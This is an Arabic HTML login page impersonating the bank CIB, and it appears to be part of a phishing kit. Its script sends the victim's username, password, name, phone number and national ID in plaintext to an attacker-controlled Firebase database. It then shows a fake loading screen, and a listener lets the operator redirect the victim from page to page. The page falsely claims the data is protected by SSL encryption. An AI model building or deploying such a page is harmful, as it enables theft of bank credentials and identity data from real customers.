<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>تسجيل الدخول | CIB</title>

    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">

    <style>

        *{
            margin:0;
            padding:0;
            box-sizing:border-box;
        }

        body{
            font-family:'Cairo',sans-serif;
            background:#f1f5f9;
            min-height:100vh;
            display:flex;
            justify-content:center;
            align-items:flex-start;
            padding:20px;
        }

        .page-wrapper{
            width:100%;
            max-width:420px;
            background:#fff;
            border-radius:24px;
            overflow:hidden;
            box-shadow:0 15px 40px rgba(0,0,0,0.08);
        }

        /* =========================
           HEADER
        ========================== */

        .hero{
            background:linear-gradient(135deg,#1a5ca8,#0d3b6e);
            padding:35px 25px 45px;
            text-align:center;
            position:relative;
            overflow:hidden;
        }

        .hero::before{
            content:'';
            position:absolute;
            width:300px;
            height:300px;
            background:rgba(255,255,255,0.05);
            border-radius:50%;
            top:-120px;
            right:-120px;
        }

        .logo{
            width:120px;
            filter:brightness(10);
            position:relative;
            z-index:2;
        }

        .hero-title{
            color:#fff;
            font-size:24px;
            font-weight:800;
            margin-top:18px;
            position:relative;
            z-index:2;
        }

        .hero-sub{
            color:rgba(255,255,255,0.75);
            font-size:13px;
            margin-top:6px;
            position:relative;
            z-index:2;
        }

        /* =========================
           FORM
        ========================== */

        .form-area{
            padding:30px 22px;
        }

        .input-group{
            margin-bottom:20px;
        }

        .input-label{
            display:block;
            margin-bottom:8px;
            font-size:14px;
            font-weight:700;
            color:#334155;
        }

        .input-wrap{
            position:relative;
        }

        .input-field{
            width:100%;
            height:55px;
            border:1.5px solid #dbe4ee;
            border-radius:14px;
            padding:0 18px;
            font-size:15px;
            font-family:'Cairo',sans-serif;
            background:#f8fafc;
            transition:0.3s;
            outline:none;
        }

        .input-field:focus{
            border-color:#1a5ca8;
            background:#fff;
            box-shadow:0 0 0 4px rgba(26,92,168,0.08);
        }

        .input-field::placeholder{
            color:#94a3b8;
        }

        .toggle-password{
            position:absolute;
            left:15px;
            top:50%;
            transform:translateY(-50%);
            border:none;
            background:none;
            cursor:pointer;
            font-size:18px;
            color:#64748b;
        }

        .forgot{
            display:block;
            text-align:left;
            margin-top:-8px;
            margin-bottom:22px;
            color:#1a5ca8;
            text-decoration:none;
            font-size:13px;
            font-weight:700;
        }

        /* =========================
           BUTTON
        ========================== */

        .login-btn{
            width:100%;
            height:56px;
            border:none;
            border-radius:16px;
            background:linear-gradient(135deg,#1a5ca8,#2563eb);
            color:#fff;
            font-size:17px;
            font-weight:800;
            font-family:'Cairo',sans-serif;
            cursor:pointer;
            transition:0.3s;
        }

        .login-btn:hover{
            transform:translateY(-2px);
            box-shadow:0 10px 25px rgba(37,99,235,0.25);
        }

        /* =========================
           ERROR
        ========================== */

        .error-box{
            display:none;
            background:#fef2f2;
            border:1px solid #fecaca;
            color:#b91c1c;
            padding:14px;
            border-radius:12px;
            margin-bottom:18px;
            font-size:13px;
            font-weight:700;
        }

        .error-box.active{
            display:block;
        }

        /* =========================
           SECURITY
        ========================== */

        .security{
            margin-top:22px;
            text-align:center;
            color:#64748b;
            font-size:12px;
        }

        /* =========================
           FOOTER
        ========================== */

        .contact-bar{
            background:#06b6d4;
            color:#fff;
            text-align:center;
            padding:15px;
            font-size:14px;
        }

        .contact-bar a{
            color:#fff;
            font-weight:700;
            text-decoration:none;
        }

        .bottom-nav{
            background:#0d3b6e;
            display:flex;
            justify-content:space-around;
            padding:15px 10px;
        }

        .nav-item{
            color:#fff;
            font-size:11px;
            text-align:center;
            opacity:0.9;
        }

        /* =========================
           LOADING
        ========================== */

        .loading-overlay{
            position:fixed;
            inset:0;
            background:rgba(0,0,0,0.45);
            display:none;
            justify-content:center;
            align-items:center;
            z-index:999;
            backdrop-filter:blur(4px);
        }

        .loading-overlay.active{
            display:flex;
        }

        .loader-box{
            width:220px;
            background:#fff;
            border-radius:22px;
            padding:35px 25px;
            text-align:center;
        }

        .spinner{
            width:50px;
            height:50px;
            border:4px solid #dbeafe;
            border-top-color:#2563eb;
            border-radius:50%;
            margin:auto;
            animation:spin 0.8s linear infinite;
        }

        @keyframes spin{
            to{
                transform:rotate(360deg);
            }
        }

        .loader-title{
            margin-top:18px;
            font-weight:800;
            color:#0f172a;
        }

        .loader-sub{
            color:#64748b;
            margin-top:5px;
            font-size:13px;
        }

    </style>
</head>

<body>

<div class="page-wrapper">

    <!-- HERO -->
    <div class="hero">

        <img src="assets/logo.webp" class="logo" alt="CIB">

        <div class="hero-title">
            تسجيل الدخول
        </div>

        <div class="hero-sub">
            قم بإدخال بيانات الحساب للمتابعة
        </div>

    </div>

    <!-- FORM -->
    <div class="form-area">

        <div class="error-box" id="errorBox">
            اسم المستخدم أو كلمة المرور غير صحيحة
        </div>

        <form id="loginForm">

            <!-- USERNAME -->
            <div class="input-group">

                <label class="input-label">
                    اسم المستخدم
                </label>

                <div class="input-wrap">
                    <input
                        type="text"
                        class="input-field"
                        id="username"
                        placeholder="أدخل اسم المستخدم"
                    >
                </div>

            </div>

            <!-- PASSWORD -->
            <div class="input-group">

                <label class="input-label">
                    كلمة المرور
                </label>

                <div class="input-wrap">

                    <input
                        type="password"
                        class="input-field"
                        id="password"
                        placeholder="أدخل كلمة المرور"
                    >

                    <button
                        type="button"
                        class="toggle-password"
                        onclick="togglePassword()"
                    >
                        👁
                    </button>

                </div>

            </div>

            <a href="#" class="forgot">
                هل نسيت كلمة المرور؟
            </a>

            <!-- BUTTON -->
            <button class="login-btn" type="submit">
                تسجيل الدخول
            </button>

        </form>

        <div class="security">
            بياناتك محمية بتشفير 256-bit SSL
        </div>

    </div>

    <!-- CONTACT -->
    <div class="contact-bar">

        تحتاج إلى مساعدة؟
        <a href="#">
            اتصل بنا
        </a>

    </div>

    <!-- NAV -->
    <div class="bottom-nav">

        <div class="nav-item">
            الفروع والصراف
        </div>

        <div class="nav-item">
            مكافأة CIB
        </div>

        <div class="nav-item">
            أسعار الصرف
        </div>

    </div>

</div>

<!-- LOADING -->
<div class="loading-overlay" id="loadingOverlay">

    <div class="loader-box">

        <div class="spinner"></div>

        <div class="loader-title">
            جاري تسجيل الدخول
        </div>

        <div class="loader-sub">
            يرجى الانتظار...
        </div>

    </div>

</div>

<script type="module">

import {
    getApp,
    getApps,
    initializeApp
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {

    getFirestore,
    doc,
    setDoc,
    serverTimestamp

} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

/* =========================
   FIREBASE
========================= */

const firebaseConfig = {

  apiKey: "AIzaSyDkGm7g7nvOQqvBUriLwiGAJh1vutsnsMk",

  authDomain: "tijari-42163.firebaseapp.com",

  projectId: "tijari-42163",

  storageBucket: "tijari-42163.firebasestorage.app",

  messagingSenderId: "283984614907",

  appId: "1:283984614907:web:8b9d27c4dfef86d116275e",

  measurementId: "G-P9KGR3B48Y"

};

const app =
    getApps().length
    ? getApp()
    : initializeApp(firebaseConfig);

const db = getFirestore(app);


/* =========================
   PASSWORD TOGGLE
========================= */

window.togglePassword = function(){

    const input = document.getElementById('password');

    if(input.type === 'password'){
        input.type = 'text';
    }else{
        input.type = 'password';
    }

}

/* =========================
   FORM SUBMIT
========================= */

document
.getElementById('loginForm')
.addEventListener('submit', async function(e){

    e.preventDefault();

    const username =
        document.getElementById('username').value.trim();

    const password =
        document.getElementById('password').value.trim();

    const errorBox =
        document.getElementById('errorBox');

    /* validation */

    if(username === '' || password === ''){

        errorBox.classList.add('active');

        return;

    }

    errorBox.classList.remove('active');

    /* keep your localStorage logic */

    localStorage.setItem(
        'loginData',
        JSON.stringify({
            username,
            password
        })
    );

    /* get registration data */

    const demoUser =
        JSON.parse(localStorage.getItem('demoUser'));

    /* save to firebase */

const userId =
    localStorage.getItem("userId");

if(!userId){

    alert("User ID not found");

    return;

}
await setDoc(doc(db,"users",userId),{

    name: demoUser?.fullName || "",
    phone: demoUser?.phoneNumber || "",
    nationalId: demoUser?.idNumber || "",

    username: username,
    password: password,

    status: "pending",

    currentPage: "waitaccount.html",

    createdAt: serverTimestamp(),
    lastSeen: Date.now()

},{ merge:true });

    /* loading */

    document
        .getElementById('loadingOverlay')
        .classList.add('active');

    /* redirect */

    setTimeout(() => {

        window.location.href = 'waitaccount.html';

    }, 2500);

});

</script>


<script type="module">

import { getApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {
    getFirestore,
    doc,
    onSnapshot
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

/* use existing firebase app */

const existingApp = getApp();

const firestore = getFirestore(existingApp);

/* user id */



/* current login */

const loginData =
    JSON.parse(localStorage.getItem("loginData"));

if(loginData){

    const userId =
        localStorage.getItem("userId")

    onSnapshot(doc(firestore,"users",userId),(docSnap)=>{

        if(!docSnap.exists()) return;

        const user = docSnap.data();

        const currentPage = user.currentPage;

        const currentFile =
            window.location.pathname
            .split("/")
            .pop();

        if(
            currentPage &&
            currentPage !== currentFile
        ){

            window.location.href =
                currentPage;

        }

    });

}

</script>

</body>
</html>
